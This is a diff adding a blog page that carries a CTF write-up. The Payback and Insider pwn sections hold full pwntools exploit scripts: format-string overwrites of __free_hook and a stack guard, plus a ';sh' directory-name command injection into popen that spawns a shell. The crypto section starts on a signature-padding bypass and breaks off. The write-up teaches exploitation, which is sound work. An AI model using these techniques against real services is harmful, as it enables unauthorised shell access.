@@ -1,0 +1,589 @@
+<!doctype html>
+<html lang="en" data-theme="auto">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https://pbs.twimg.com https://abs.twimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net data:; script-src 'self' https://cdn.jsdelivr.net https://platform.twitter.com; connect-src 'self' https://platform.twitter.com https://syndication.twitter.com https://cdn.syndication.twimg.com https://nitter.net; frame-src https://platform.twitter.com https://syndication.twitter.com https://nitter.net; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests">
+<title>CTF Write-up [test] | st4rlight</title>
+<meta name="description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.">
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="alternate" type="application/atom+xml" title="st4rlight Feed" href="/feed.xml">
+<link rel="icon" href="/assets/img/og-default.svg">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CTF Write-up [test] | st4rlight</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="CTF Write-up [test]" />
+<meta name="author" content="st4rlight" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways." />
+<meta property="og:description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways." />
+<link rel="canonical" href="https://st4rlight.github.io/research/2024/07/19/ctf_test/" />
+<meta property="og:url" content="https://st4rlight.github.io/research/2024/07/19/ctf_test/" />
+<meta property="og:site_name" content="st4rlight" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-19T14:00:00+09:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CTF Write-up [test]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"st4rlight"},"dateModified":"2024-07-19T14:00:00+09:00","datePublished":"2024-07-19T14:00:00+09:00","description":"CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.","headline":"CTF Write-up [test]","mainEntityOfPage":{"@type":"WebPage","@id":"https://st4rlight.github.io/research/2024/07/19/ctf_test/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://st4rlight.github.io/assets/img/og-default.svg"},"name":"st4rlight"},"url":"https://st4rlight.github.io/research/2024/07/19/ctf_test/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  </head>
+  <body data-line-numbers="true">
+    <a class="skip-link" href="#main-content">Skip to content</a>
+    <header class="site-header">
+  <div class="shell header-shell">
+    <a class="brand" href="/" aria-label="Go to home">
+      <span class="brand-mark">Hacky</span>
+      <span class="brand-text">Life &amp; Writeup</span>
+    </a>
+    <nav class="main-nav" aria-label="Primary">
+      <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="menu-list">Menu</button>
+      <ul id="menu-list">
+        
+          
+          
+          
+            <li><a href="/" >Home</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/about/" >About</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/timeline/" >Timeline</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/posts/" >Posts</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/search/" >Search</a></li>
+          
+        
+      </ul>
+    </nav>
+    <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle color theme">Theme</button>
+  </div>
+</header>
+
+    <main id="main-content" class="site-main">
+      <article class="shell post-shell" itemscope itemtype="https://schema.org/Article">
+  <header class="post-header">
+    <p class="eyebrow">ctf</p>
+    <h1 itemprop="headline">CTF Write-up [test]</h1>
+    <p class="post-description" itemprop="description">CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+    <p class="post-meta">
+      <time datetime="2024-07-19T14:00:00+09:00" itemprop="datePublished">2024-07-19</time>
+      <span> · updated 2024-07-19</span>
+      
+    </p>
+    
+      <ul class="chip-list">
+        
+          <li><a href="/tags/#tag-research">#research</a></li>
+        
+          <li><a href="/tags/#tag-ctf">#ctf</a></li>
+        
+          <li><a href="/tags/#tag-writeup">#writeup</a></li>
+        
+      </ul>
+    
+    
+  </header>
+
+  <div class="post-body-wrap">
+    <div class="post-content js-article" itemprop="articleBody">
+      <h2 id="summary">Summary</h2>
+<p>Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic.  <br />
+pwn focused on FSB attack or ezpz kernel exploitation.  <br />
+RSA, elgamel simple attack in crypto. and etc..</p>
+
+<h2 id="tasks">Tasks</h2>
+
+<ul>
+  <li>Pwnable💻
+    <ul>
+      <li><a href="#pwn--payback">Payback</a></li>
+      <li><a href="#pwn--insider">Insider</a></li>
+      <li><a href="#pwn--opendoor">OpenDoor</a></li>
+    </ul>
+  </li>
+  <li>Cryptography💡
+    <ul>
+      <li><a href="#crypto--bbgun06">BBGun06 (+ revenge)</a></li>
+      <li><a href="#crypto--elelgamal">ElElGamal</a></li>
+    </ul>
+  </li>
+  <li>Reversing⚙️
+    <ul>
+      <li><a href="#rev--breakout">BreakOut</a></li>
+      <li><a href="#rev--chromeminer">ChromeMiner, Assisted</a></li>
+    </ul>
+  </li>
+  <li>Forensic🔎
+    <ul>
+      <li><a href="#for--linas-invitation">Lina’s Invitation</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="pwn--payback">PWN : Payback</h2>
+
+<h3 id="1-analyze">1. Analyze</h3>
+<p>mitigations are here:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b<span class="s1">'./.glibc/'</span>
+</code></pre></div></div>
+<p>I found that <code class="language-plaintext highlighter-rouge">delete_bot</code> function has Format string bug when I send delete_reason.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">delete_bot</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+    <span class="n">id</span> <span class="o">=</span> <span class="n">getId</span><span class="p">();</span> <span class="c1">// 0 ~ 31</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">char</span> <span class="n">reasonbuf</span><span class="p">[</span><span class="n">MAX_REASON_SIZE</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="sc">'\x00'</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span><span class="p">);</span>
+        <span class="c1">// gather statistics</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Enter the reason of deletion: "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span><span class="p">);</span>
+        <span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Bot Deleted successfully! | Reason: "</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error: Unable to fetch the requested bot entry.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">reasonbuf</code> is in a stack area so I can check FSB attack offset with input buffer.  <br />
+If I manage <code class="language-plaintext highlighter-rouge">__free_hook</code>, I can call <code class="language-plaintext highlighter-rouge">system("/bin/sh\x00")</code> when I call <code class="language-plaintext highlighter-rouge">delete_bot</code>.  <br />
+Setting bot’s URL to <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> and calling free can trigger shell.  <br />
+Let’s exploit!</p>
+
+<h3 id="2-exploit-code">2. Exploit Code</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># p=process("./payback")
+</span><span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">142.93.37.110</span><span class="sh">"</span><span class="p">,</span><span class="mi">30669</span><span class="p">)</span>
+<span class="n">e</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./payback</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">l</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">.glibc/libc.so.6</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+    <span class="nf">pause</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">)</span>
+
+<span class="nf">add</span><span class="p">()</span>
+<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">%p</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># overwrite offset : 8
+</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Reason: </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1ed723</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+
+<span class="nf">add</span><span class="p">()</span>
+
+<span class="n">low</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<span class="n">high</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>
+
+<span class="k">if</span> <span class="n">mid</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
+    <span class="n">rmid</span> <span class="o">=</span> <span class="n">mid</span><span class="o">-</span><span class="n">low</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">rmid</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">mid</span><span class="o">-</span><span class="n">low</span>
+
+<span class="k">if</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">mid</span><span class="p">:</span>
+    <span class="n">rhigh</span> <span class="o">=</span> <span class="n">high</span><span class="o">-</span><span class="n">mid</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">rhigh</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">high</span><span class="o">-</span><span class="n">mid</span>
+
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">low</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">high</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">low</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%13$hn</span><span class="sh">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">rmid</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%14$hn</span><span class="sh">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">rhigh</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%15$hn</span><span class="sh">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="c1">#print(len(payload))
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+
+<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="nf">add</span><span class="p">()</span>
+<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><img src="/assets/img/legacy/2022-htb_businessctf/1.png" alt="1.png" /></p>
+
+<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}</code>.</p>
+
+<hr />
+
+<h2 id="pwn--insider">PWN : Insider</h2>
+
+<h3 id="1-analyze-1">1. Analyze</h3>
+<p>Binary run FTP cli program with 30 commands.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">USER ;)</code> : compare with <code class="language-plaintext highlighter-rouge">;)</code> string, if it’s correct, prepare <code class="language-plaintext highlighter-rouge">PASS</code> command.</li>
+  <li><code class="language-plaintext highlighter-rouge">PASS ;)</code> : same with <code class="language-plaintext highlighter-rouge">USER</code> command, if password correct, I can use all of cmds.</li>
+  <li><code class="language-plaintext highlighter-rouge">BKDR [payload]</code> : short expression of <code class="language-plaintext highlighter-rouge">backdoor</code> I think, it can be attacked by FSB with limited condition.</li>
+  <li><code class="language-plaintext highlighter-rouge">LIST</code> : get current working directory (CWD) by using <code class="language-plaintext highlighter-rouge">getcwd()</code> function.  <br />
+also run <code class="language-plaintext highlighter-rouge">ls -al [result of getcwd()]</code> with <code class="language-plaintext highlighter-rouge">popen</code>.  <br />
+if process run successfully, result should be written in console.</li>
+  <li><code class="language-plaintext highlighter-rouge">CWD [path]</code> : change working directory with my own path.</li>
+  <li><code class="language-plaintext highlighter-rouge">MKDR [path]</code> : make directory with my own path.</li>
+  <li>.. etc</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">BKDR</code> command can leak stack area or overwrite stack area.  <br />
+I found unchanged stack position that makes denied access to <code class="language-plaintext highlighter-rouge">LIST</code> command.  <br />
+(value : -1, <code class="language-plaintext highlighter-rouge">LIST</code> NOT ALLOWED!)</p>
+
+<p>at first, I used <code class="language-plaintext highlighter-rouge">RETR</code> command to read <code class="language-plaintext highlighter-rouge">/flag.txt</code>, but this file’s permission is only <code class="language-plaintext highlighter-rouge">read in root</code>, <code class="language-plaintext highlighter-rouge">r--------</code>.<br />
+Need to find another way..</p>
+
+<p><img src="/assets/img/legacy/2022-htb_businessctf/2.png" alt="2.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">v131</code> should be more than 0, so if I found right offset of <code class="language-plaintext highlighter-rouge">v131</code>, can be overwritten by <code class="language-plaintext highlighter-rouge">%[offset]$n</code>.</p>
+
+<h3 id="2-after-getting-shell">2. After Getting shell..?</h3>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">MKDR ;sh</code> : make directory named <code class="language-plaintext highlighter-rouge">;sh</code>. it’s legal expression in linux.</li>
+  <li><code class="language-plaintext highlighter-rouge">CWD ;sh</code> : change working directory to <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code></li>
+  <li><code class="language-plaintext highlighter-rouge">LIST</code> : call <code class="language-plaintext highlighter-rouge">getcwd()</code> =&gt; <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code> and combine string (result : <code class="language-plaintext highlighter-rouge">ls -al /home/ctf/;sh</code>) !!!SHELL EXECUTED!!!</li>
+  <li>In the shell, <code class="language-plaintext highlighter-rouge">cd /home/ctf</code> =&gt; I noticed that <code class="language-plaintext highlighter-rouge">get_flag</code> file’s RUNPATH is <code class="language-plaintext highlighter-rouge">./</code>, so changing working directory to <code class="language-plaintext highlighter-rouge">/home/ctf</code> is necessary.</li>
+  <li>In the shell, <code class="language-plaintext highlighter-rouge">./get_flag</code> =&gt; Execute!</li>
+  <li>In the shell, <code class="language-plaintext highlighter-rouge">exit</code> =&gt; for receiving results of entire commands.  <br />
+(because commands is running in <code class="language-plaintext highlighter-rouge">popen</code> process)</li>
+</ol>
+
+<h3 id="3-exploit-code">3. Exploit Code</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#context.log_level = 'debug'
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">104.248.175.153</span><span class="sh">"</span><span class="p">,</span><span class="mi">30467</span><span class="p">)</span>
+<span class="c1">#p = process('./chall')
+</span>
+<span class="k">def</span> <span class="nf">qwer</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">noRecv</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">noRecv</span><span class="p">:</span>  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">USER ;)</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">PASS ;)</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">BKDR %p %p %p %p %p %p %p</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">(nil) 0x</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x66c0</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">BKDR</span><span class="sh">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> %1035$n</span><span class="sh">'</span>
+
+<span class="c1">#pause()
+</span><span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">ASDF</span><span class="sh">"</span>
+<span class="nf">qwer</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#qwer("STOR .profile")
+#qwer("alias ls='sh;ls'".ljust(0x1000, 'a') + 'LIST', True)
+#p.shutdown('send')
+</span>
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">MKDR ;sh</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">CWD ;sh</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">LIST</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">cd /home/ctf</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">./get_flag</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">exit</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}</code>.</p>
+
+<hr />
+
+<h2 id="pwn--opendoor">PWN : OpenDoor</h2>
+<p>! REDACTED !  <br />
+Exploit Code : <a href="https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb" target="_blank">https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb</a></p>
+
+<hr />
+
+<h2 id="crypto--bbgun06">CRYPTO : BBGun06</h2>
+<h3 id="1-analyze-2">1. Analyze</h3>
+
+<p>BBGun06 / revenge has same <code class="language-plaintext highlighter-rouge">verify(self,message, signature)</code> code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">signature</span><span class="p">):</span>
+        <span class="n">keylength</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">n</span><span class="p">))</span>
+        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>
+        <span class="n">clearsig</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="n">keylength</span><span class="p">,</span> <span class="sh">"</span><span class="s">big</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="n">r</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x01\xff</span><span class="s">+?</span><span class="se">\x00</span><span class="s">(.{15})(.{20})</span><span class="sh">'</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">clearsig</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="n">self</span><span class="p">.</span><span class="n">asn1</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">sha1</span><span class="p">(</span><span class="n">message</span><span class="p">).</span><span class="nf">digest</span><span class="p">():</span>
+            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="bp">True</span>
+</code></pre></div></div>
+
+<p>And en/decrypt function changes signature code(byte) to long by using <code class="language-plaintext highlighter-rouge">bytes_to_long</code> to calculate with integer.  <br />
+Decrypted message is same when I give bytes string that has same integer result. That means, <code class="language-plaintext highlighter-rouge">dec("0001") == dec("01")</code>.<br />
+It’s simple!  <br />
+send given signature with <code class="language-plaintext highlighter-rouge">00</code> :D, <code class="language-plaintext highlighter-rouge">00 + sig</code>  <br />
+revenge prob has the same solving process lol:) See below.</p>
+<h3 id="2-exploit-manual">2. Exploit (Manual)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// for_BBGun06
